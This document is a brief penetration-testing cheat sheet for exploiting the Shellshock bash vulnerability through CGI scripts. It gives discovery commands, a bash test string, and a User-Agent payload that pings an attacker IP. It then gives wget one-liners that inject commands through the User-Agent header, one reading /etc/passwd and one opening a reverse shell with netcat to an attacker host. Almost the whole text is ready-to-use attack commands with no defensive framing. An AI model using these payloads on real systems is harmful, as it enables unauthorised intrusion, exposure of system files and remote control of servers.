Vulnerability associated with multiple vectors
## CGI
### Find:
	dirsearch -u [ip] -r -e cgi
	nmap --script http-shellshock $ip

### Test
	Bash: env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
	
	User-Agent: () { :;}; ping -c 5 -p [uniques_string] [attacker ip]

### Exploit
#### If http-shellshock comes as positive
	wget -U "() { foo;}; echo \"Content-type: text/plain\"; echo; echo; [command]" http://[ip]/cgi-bin/login.cgi
	
	wget -U "() { foo;}; echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://[ip]/cgi-bin/login.cgi && cat login.cgi
	
	wget -U "() { foo;}; echo \"Content-type: text/plain\"; echo; echo; /bin/nc [attacker ip] [port] -e /bin/sh" http://[ip]/cgi-bin/login.cgi
	